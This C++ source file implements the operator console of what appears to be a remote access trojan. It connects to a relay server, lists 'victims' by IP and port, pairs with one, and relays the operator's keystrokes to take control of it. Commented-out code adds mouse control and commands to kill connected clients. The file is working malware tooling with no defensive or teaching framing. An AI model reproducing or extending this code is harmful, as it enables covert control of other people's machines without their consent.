#include "controller.h"

Controller::Controller()
{
    connectServer();

    std::thread receive(&Controller::receiveInfo, this);
    receive.detach();
    std::thread input(&Controller::takeCmdInput, this);
    input.detach();
}

void Controller::controlWindow()
{
    bool keys[255];
    for (int i = 0; i < 256; i++)
        keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));

    while (true)
    {
        if (!isConnected) {
            std::cout << "DISCONNECTED FROM SERVER\n";
            controllers.clear();
            victims.clear();
            connectServer();
            std::thread receive(&Controller::receiveInfo, this);
            receive.detach();
        }

        //open window if needed or skip is not controlling
        if (!w.isOpen())
        {
            if (isControlling) {
                w.create(sf::VideoMode(0, 0), "Controller", sf::Style::Fullscreen);
                w.setFramerateLimit(20);
            }
            else
                continue;
        }
        else if (!isControlling || !isPaired) {
            w.close();
        }

        sf::Event e;
        while (w.pollEvent(e)) {
            if (e.type == sf::Event::Closed) {
                w.close();
                isControlling = false;
                //socket->send("a", 1, SERVER_IP, SERVER_PORT);
            }
            //else if (e.type == sf::Event::MouseWheelScrolled)
            //{
            //    std::string str = "k";
            //    str = str + char(e.mouseWheelScroll.delta);
            //    socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            //}
            //else if (e.type == sf::Event::MouseMoved)
            //{
            //    std::string str = "l";
            //    float x = e.mouseMove.x / float(screenSize.x), y = e.mouseMove.y / float(screenSize.y);
            //    str = str + char(x * 255) + char(y * 255);
            //    socket->send(str.c_str(), str.size(), SERVER_IP, SERVER_PORT);
            //}
        }

        //send key pressed-released events if needed
        for (int i = 0; i < 256; i++)
        {
            bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
            if (!state && keys[i]) {
                sf::Packet p;
                p << sf::Uint8('m') << sf::Uint8(i);
                server.send(p);
            }
            else if (Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i))) {
                sf::Packet p;
                p << sf::Uint8('n') << sf::Uint8(i);
                server.send(p);
            }
            keys[i] = state;
        }

        w.clear(sf::Color(30, 30, 30));
        w.display();
    }
}

void Controller::receiveInfo()
{
    while (true)
    {
        sf::Packet p;
        server.receive(p);
        if (p.getDataSize() == 0) {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }

        sf::Uint8 cmd;
        p >> cmd;

        //add new controller info
        if (cmd == 'n') {
            sf::Uint16 id, otherId, port;
            sf::Uint32 time, ip;
            p >> id >> time >> ip >> port >> otherId;
            controllers.push_back(Client(id, time, sf::IpAddress(ip).toString(), port, otherId));
        }
        //add new victim info
        else if (cmd == 'l') {
            sf::Uint16 id, otherId, port;
            sf::Uint32 time, ip;
            p >> id >> time >> ip >> port >> otherId;
            victims.push_back(Client(id, time, sf::IpAddress(ip).toString(), port, otherId));
        }
        //clear clients list
        else if (cmd == 'q') {
            controllers.clear();
            victims.clear();
        }
        //display clients info
        else if (cmd == 'd') {
            displayList();
        }
        //apparently controller isnt initialized
        else if (cmd == '?') {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }
        //pair controller with victim
        else if (cmd == 'p')
        {
            isPaired = true;
            isControlling = false;
        }
        /*//un-pair controller with victim
        else if (msg[0] == 'u')
        {
            isPaired = false;
            isControlling = false;
        }
        //exit program
        else if (msg[0] == 'e') {
            isRunning = false;
        }*/
    }
}

void Controller::takeCmdInput()
{
    std::string cmd;
    while (true)
    {
        std::cin >> cmd;

        if (!isConnected)
            continue;

        if (cmd.substr(0, 7) == "connect" && !isPaired) {
            cmd.erase(0, 7);
            int num = 0;
            try {
                num = stoi(cmd);
            } 
            catch (std::invalid_argument e) {
                continue;
            } 
            catch (std::out_of_range e) {
                continue;
            }

            for (auto v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('p') << v.id;
                server.send(p);
                break;
            }
        }
        /*else if (cmd.substr(0, 10) == "disconnect" && isPaired) {
            socket->send("u", 1, SERVER_IP, SERVER_PORT);
        }*/
        else if (cmd.substr(0, 7) == "control" && isPaired) {
            isControlling = true;
        }
        /*else if (cmd.substr(0, 8) == "unalivec") {
            cmd.erase(0, 8);
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            if (num >= 0 && num < controllers.size())
            {
                std::string msg = "e" + controllers[num].ip + ";" + std::to_string(controllers[num].port) + ";";
                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
            }
        }
        else if (cmd.substr(0, 8) == "unalivev") {
            cmd.erase(0, 8);
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            if (num >= 0 && num < victims.size())
            {
                std::string msg = "e" + victims[num].ip + ";" + std::to_string(victims[num].port) + ";";
                socket->send(msg.c_str(), msg.size(), SERVER_IP, SERVER_PORT);
            }
        }
        */
    }
}

void Controller::connectServer()
{
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

init:
    sf::Uint8 role = '-';
    sf::Packet p;
    p << sf::Uint8('c');
    server.send(p);
    p.clear();
    server.receive(p);
    p >> role;
    if (role != 'c')
        goto init;
    p >> id;
    std::cout << "connection with server approved\n";

    isConnected = true;
}

void Controller::displayList()
{
    system("CLS");
    std::cout << "last update time: " << Mlib::getTime() / 1000 << " - id: " << id << "\n\n";

    std::cout << "CONTROLLERS:\n";
    for (auto c : controllers) {
        std::cout << "   id: " << c.id;
        if (c.id == id)
            std::cout << " (you)";
        std::cout << " = " << c.ip << ':' << c.port << " - time: " << c.time;
        if (c.otherId == 0)
            std::cout << " - not paired\n";
        else
            std::cout << " - paired with " << c.otherId << "\n";
    }

    std::cout << "\nVICTIMS:\n";
    for (auto v : victims) {
        std::cout << "   id: " << v.id << " = " << v.ip << ':' << v.port << " - time: " << v.time;
        if (v.otherId == 0)
            std::cout << " - not paired\n";
        else {
            std::cout << " - paired with " << v.otherId;
            if (v.otherId == id)
                std::cout << " (you)";
            std::cout << '\n';
        }
    }
    std::cout << '\n';
}
